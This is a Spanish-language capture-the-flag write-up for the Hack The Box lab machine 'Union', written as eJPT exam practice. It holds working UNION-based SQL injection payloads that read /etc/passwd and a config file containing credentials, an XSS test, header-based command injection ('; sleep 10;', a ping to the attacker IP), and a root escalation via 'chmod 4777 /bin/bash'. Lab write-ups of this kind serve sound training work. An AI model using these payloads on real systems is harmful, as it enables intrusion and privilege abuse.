- ---
- Tags: #ejptmachine #htmlinjection #xxs #sqlinyection #burpsuite #curl #tcpdump #rce 
--- ---
### ¿Qué habilidades puedes practicar con Union?

1. **Reconocimiento web:**
    - Al igual que muchas máquinas de Hack The Box, **Union** te pedirá que realices un escaneo de puertos con **Nmap** y una **enumeración web** utilizando herramientas como **Gobuster** o **Dirbuster** para descubrir rutas o archivos interesantes.
    - Union se enfoca en **servicios web**, por lo que la exploración de aplicaciones web vulnerables es crucial. Te ayudará a mejorar tus habilidades en **enumeración de directorios** y explotación de vulnerabilidades típicas en aplicaciones web.
2. **Explotación de vulnerabilidades web:**
    - La máquina está centrada en una vulnerabilidad de **Inyección SQL (SQLi)**. Esta es una vulnerabilidad común en aplicaciones web, y la máquina te permitirá practicar cómo identificar y explotar SQLi en una aplicación vulnerable.
    - Esto es muy relevante para la **eJPTv2**, donde aprenderás a detectar y explotar vulnerabilidades en aplicaciones web, incluyendo inyecciones SQL y otros errores comunes.
3. **Escalada de privilegios:**
    - Después de obtener acceso a la máquina, deberás realizar una **escalada de privilegios** en un entorno **Linux**.
    - Esto implica identificar configuraciones erróneas en el sistema, como permisos incorrectos, configuraciones vulnerables de Sudo o cron jobs mal configurados.

---

`nmap -p- -sV -sC --open -sS -vvv -n -Pn 10.10.11.128 -oN escaneo`

![Pasted image 20241118140446](../../Fotos/Pasted%20image%2020241118140446.png)

![Pasted image 20241118140603](../../Fotos/Pasted%20image%2020241118140603.png)

`nmap --script "vuln and safe" -p80 10.10.11.128`

![Pasted image 20241118144257](../../Fotos/Pasted%20image%2020241118144257.png)

- Es para ver si obtenemos algo mas de info ya que vemos que solo muestra el puerto 80 abierto, hacemos esto para ver si podemos obtener algo mas pero no es el caso mas que la cookie.

Whatweb

![Pasted image 20241118144533](../../Fotos/Pasted%20image%2020241118144533.png)

*Esto es para ver si es vulnerable a html injection*

![Pasted image 20241118153659](../../Fotos/Pasted%20image%2020241118153659.png)

![Pasted image 20241118153746](../../Fotos/Pasted%20image%2020241118153746.png)

*Nos entrega la data html por ende si es vulnerable*

*Verificamos si es vulnerable a XSS*
<script>alert("XSS");</script>>
![Pasted image 20241118153943](../../Fotos/Pasted%20image%2020241118153943.png)
*Es vulnerable*

Al ingresar datos nos manda a challenge.php

![Pasted image 20241118154205](../../Fotos/Pasted%20image%2020241118154205.png)

`wfuzz -c --hc 404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.11.128/FUZZ.php`

![Pasted image 20241118155210](../../Fotos/Pasted%20image%2020241118155210.png)

*Verificamos si es vulnerable a SQLI*

Aqui causamos un error ya que no obtenemos nada ya que nos debería decir complete the challenge HERE y eso no sale tras ingresar esta data

![Pasted image 20241118154730](../../Fotos/Pasted%20image%2020241118154730.png)

`' order by 15-- -`
- Nos permite realizar un ordenamiento de datos basados en la columna numero 1,2,3 etc la que elijamos hay que ir probando, en este caso no nos entrega nada.

`'union select 1-- -`
- Causamos otro error
- Si no hubiera error podríamos probar cambiando el 1 por 1,2  1,2,3  1,2,3,4  1,2,3,4,5 etc.
- En este caso el error se causa en el 1

![Pasted image 20241118155132](../../Fotos/Pasted%20image%2020241118155132.png)

- Vemos que nos esta representando el valor de 1 por lo que podemos intuir que si colocamos otra data allí se debería ver reflejada en principio 

Efectivamente

![Pasted image 20241118155555](../../Fotos/Pasted%20image%2020241118155555.png)

*Es vulnerable a SQLI*

- Nombre de base de datos en uso

![Pasted image 20241118155747](../../Fotos/Pasted%20image%2020241118155747.png)

`' union select version()-- -`
- Versión de la base de datos

![Pasted image 20241118155831](../../Fotos/Pasted%20image%2020241118155831.png)

- Es el usuario detrás de la base de datos

![Pasted image 20241118155908](../../Fotos/Pasted%20image%2020241118155908.png)

- Como vemos que nos ha dado la información anterior intentamos que nos lea el archivo /etc/passwd

![Pasted image 20241118160012](../../Fotos/Pasted%20image%2020241118160012.png)

![Pasted image 20241118160024](../../Fotos/Pasted%20image%2020241118160024.png)

- Filtramos por Bash y vemos que hay 3 usuarios.

![Pasted image 20241118160341](../../Fotos/Pasted%20image%2020241118160341.png)

![Pasted image 20241118160349](../../Fotos/Pasted%20image%2020241118160349.png)

![Pasted image 20241118160356](../../Fotos/Pasted%20image%2020241118160356.png)

Probamos esta ruta para ver si nos da la flag lo cual no lo logramos pero cambiamos en este punto a probar con el otro usuario encontrado

![Pasted image 20241118160735](../../Fotos/Pasted%20image%2020241118160735.png)

![Pasted image 20241118160739](../../Fotos/Pasted%20image%2020241118160739.png)

Obtenemos de esta manera la primera *flag* de nivel usuario

![Pasted image 20241118160821](../../Fotos/Pasted%20image%2020241118160821.png)

![Pasted image 20241118160831](../../Fotos/Pasted%20image%2020241118160831.png)

`' union select schema_name from information_schema.schemata-- -`
- Nos permite listar todas las bases de datos

![Pasted image 20241118161120](../../Fotos/Pasted%20image%2020241118161120.png)

- En este caso al parecer no nos permite listar todas y solo nos muestra la mysql

Puede que limitando la manera en la cual nos entrega la información podamos obtener el nombre de todas las bases de datos una a una de la siguiente manera:

`' union select schema_name from information_schema.schemata limit 0,1-- -`

![Pasted image 20241118161446](../../Fotos/Pasted%20image%2020241118161446.png)

`' union select schema_name from information_schema.schemata limit 1,1-- -`

![Pasted image 20241118161511](../../Fotos/Pasted%20image%2020241118161511.png)

`' union select schema_name from information_schema.schemata limit 2,1-- -`

![Pasted image 20241118161544](../../Fotos/Pasted%20image%2020241118161544.png)

`' union select schema_name from information_schema.schemata limit 3,1-- -`

![Pasted image 20241118161611](../../Fotos/Pasted%20image%2020241118161611.png)

`' union select schema_name from information_schema.schemata limit 4,1-- -`

![Pasted image 20241118161737](../../Fotos/Pasted%20image%2020241118161737.png)

- Ya cuando nos tira la data y sin resultados es que no hay mas

![Pasted image 20241118161756](../../Fotos/Pasted%20image%2020241118161756.png)

*Para este punto ya enumeramos todas las bases de datos existentes en la maquina.*

`' union select group_concat(table_name)from information_schema.tables where table_schema="november"-- -`

- Como no enumera todas las bases de datos de una vez y queremos enlistar las tablas de la tabla november que es la actualmente en uso usamos esta sintaxys

![Pasted image 20241118162218](../../Fotos/Pasted%20image%2020241118162218.png)

- Vemos una tabla flag y una tabla players.

*Recordemos que nos piden una flag en la web lo cual quiere decir que en esa tabla hay una flag que necesitamos extraer.*

`' union select group_concat(column_name)from information_schema.columns where table_schema="november" and table_name="flag"-- -`

![Pasted image 20241118162703](../../Fotos/Pasted%20image%2020241118162703.png)

- Nos muestra que hay una columna que se llama ONE

`' union select group_concat(one) from flag-- -`
- Nos permite enumerar el contenido de la columna ONE, aqui no tenemos que mencionar la base de datos november ya que ya se esta aconteciendo es la que esta en uso.

![Pasted image 20241118163202](../../Fotos/Pasted%20image%2020241118163202.png)

- Posiblemente esta sea la flag del usuario UHC: `UHC{F1rst_5tep_2_Qualify}`

![Pasted image 20241118163330](../../Fotos/Pasted%20image%2020241118163330.png)

- Damos en here para ingresar la flag

![Pasted image 20241118163359](../../Fotos/Pasted%20image%2020241118163359.png)

Correcto es la flag del usuario uhc para la web nos referimos.

![Pasted image 20241118163409](../../Fotos/Pasted%20image%2020241118163409.png)

- Recordemos que en el primer escaneo con nmap no salia el puerto 22 ssh abierto, revisaremos ahora.

Ahora aparece abierto para la conexion y tenemos credenciales a nivel usuario uhc

![Pasted image 20241118185816](../../Fotos/Pasted%20image%2020241118185816.png)

Intentamos generar la conexion con lo que ya tenemos pero no corresponde a la clave.

![Pasted image 20241118190215](../../Fotos/Pasted%20image%2020241118190215.png)

*Recordemos que tenemos aun por revisar el archivo config.php y firewall.php*
Como podemos ver el contenido por la SQLI y no por la web si buscamos config.php lo forzaremos con la inyección.

Intentamos con esta linea que nos muestre el contenido sin éxito de momento al ingresarlo por la web pero ahora lo  haremos por burpsuite.
`' union select load_file("/var/www/html/config.php")-- -`

*Burpsuite*

![Pasted image 20241118191103](../../Fotos/Pasted%20image%2020241118191103.png)

  - Posibles credenciales
  $username = "uhc";
  $password = "uhc-11qual-global-pw";

![Pasted image 20241118191311](../../Fotos/Pasted%20image%2020241118191311.png)

`Maquina vulnerada`

*Ganar privilegios root*
Vemos en que grupo estamos 

![Pasted image 20241118191843](../../Fotos/Pasted%20image%2020241118191843.png)

- nada

![Pasted image 20241118191915](../../Fotos/Pasted%20image%2020241118191915.png)

- nada

*SUID*
`find / -perm -4000 2>/dev/null`

![Pasted image 20241118192145](../../Fotos/Pasted%20image%2020241118192145.png)

- Interesante> /usr/bin/pkexec

`ls -l /usr/bin/pkexec`

![Pasted image 20241118192324](../../Fotos/Pasted%20image%2020241118192324.png)

sin gcc
sin make
con wget : podriamos intentar cargar unos binarios pero primero intentaremos hacerlo de otra forma

![Pasted image 20241118192442](../../Fotos/Pasted%20image%2020241118192442.png)

De momento no tenemos otro binario interesante mas que pkexec

- Intentaremos por Capabilities
`getcap -r / 2>/dev/null`

![Pasted image 20241118192647](../../Fotos/Pasted%20image%2020241118192647.png)

- Nada

- Intentaremos Tareas Cron
`cat /etc/crontab`

![Pasted image 20241118192805](../../Fotos/Pasted%20image%2020241118192805.png)
- Nada

`netstat -nat`
![Pasted image 20241118192942](../../Fotos/Pasted%20image%2020241118192942.png)

- Puerto 53 en funcionamiento, pero por aqui no van los tiros al parecer.

La maquina no tiene nmap para saber que corre por el puerto 53 pero no importa de momento.

- Intentamos por el lado de CURL

![Pasted image 20241118193149](../../Fotos/Pasted%20image%2020241118193149.png)

- Nada

Seguimos revisando

![Pasted image 20241118193256](../../Fotos/Pasted%20image%2020241118193256.png)

![Pasted image 20241118193338](../../Fotos/Pasted%20image%2020241118193338.png)

- *IPTABLES: Herramienta de filtrado de paquetes de linux, permite a un administrador de sistema configurar tablas de firewall osea las reglas de este.*

Nos interesa poder modificar este header

![Pasted image 20241118193740](../../Fotos/Pasted%20image%2020241118193740.png)

`tcpdump -i tun0 icmp -v -n`
- Nos ponemos en escucha en nuestra maquina atacante.

![Pasted image 20241118194105](../../Fotos/Pasted%20image%2020241118194105.png)

`curl -X GET http://localhost/firewall.php -H "X_FORWARDED_FOR: 5.5.5.5; ping -c 1 10.10.14.11;"`

![Pasted image 20241118194149](../../Fotos/Pasted%20image%2020241118194149.png)

- Esto puede pasar por que no lo permite el archivo o por que hay que agregarle otra cabecera. deberia  enviarnos el ping pero por algun motivo personal no esta sucediendo ya que es un medio correcto, dado el caso usaremos burpsuite.

*Burpsuite*
- Interceptamos al colocar la flag del usuario uhc
Esta es la flag `UHC{F1rst_5tep_2_Qualify}`

![Pasted image 20241118212033](../../Fotos/Pasted%20image%2020241118212033.png)

- Enviamos al repeater y enviamos, aquí veremos que hay un redireccion a firewall.php

![Pasted image 20241118212112](../../Fotos/Pasted%20image%2020241118212112.png)

`X-Forwarded-For: ; sleep 10;`
Le agregamos es la linea

![Pasted image 20241118212421](../../Fotos/Pasted%20image%2020241118212421.png)

La respuesta tardo efectivamente los 10 segundos

![Pasted image 20241118212514](../../Fotos/Pasted%20image%2020241118212514.png)

Probamos un ping

![Pasted image 20241118212721](../../Fotos/Pasted%20image%2020241118212721.png)

Tenemos el ping hecho

![Pasted image 20241118212755](../../Fotos/Pasted%20image%2020241118212755.png)

- igualmente si no serbia podíamos hace run curl y la ip terminada por ;

Seguimos sin problemas con esta sintaxys.

![Pasted image 20241118212951](../../Fotos/Pasted%20image%2020241118212951.png)

*RCE*
En este punto ya tenemos ejecución remota de comandos

Intentamos tener una bash estando en escucha por nuestra maquina atacante por el puerto mencionado.

![Pasted image 20241118213209](../../Fotos/Pasted%20image%2020241118213209.png)

![Pasted image 20241118213319](../../Fotos/Pasted%20image%2020241118213319.png)

Logramos el acceso

![Pasted image 20241118213410](../../Fotos/Pasted%20image%2020241118213410.png)

- Ahora tenemos acceso al usuario www-data
`Maquina Vulnerada`

*Tratamiento CLI*

![Pasted image 20241118213633](../../Fotos/Pasted%20image%2020241118213633.png)

![Pasted image 20241118213706](../../Fotos/Pasted%20image%2020241118213706.png)

![Pasted image 20241118213749](../../Fotos/Pasted%20image%2020241118213749.png)

`sudo -l`

![Pasted image 20241118213857](../../Fotos/Pasted%20image%2020241118213857.png)

*Ganamos permisos ROOT*

![Pasted image 20241118214004](../../Fotos/Pasted%20image%2020241118214004.png)

`chmod 4777 /bin/bash`

![Pasted image 20241118214139](../../Fotos/Pasted%20image%2020241118214139.png)

- De esta manera los otros usuarios pueden ser root como por ejemplo el uhc.

Con el user UHC
`bash -p`

![Pasted image 20241118214234](../../Fotos/Pasted%20image%2020241118214234.png)

*Aquí conseguimos la flag del usuario root.*

![Pasted image 20241118214423](../../Fotos/Pasted%20image%2020241118214423.png)




















`











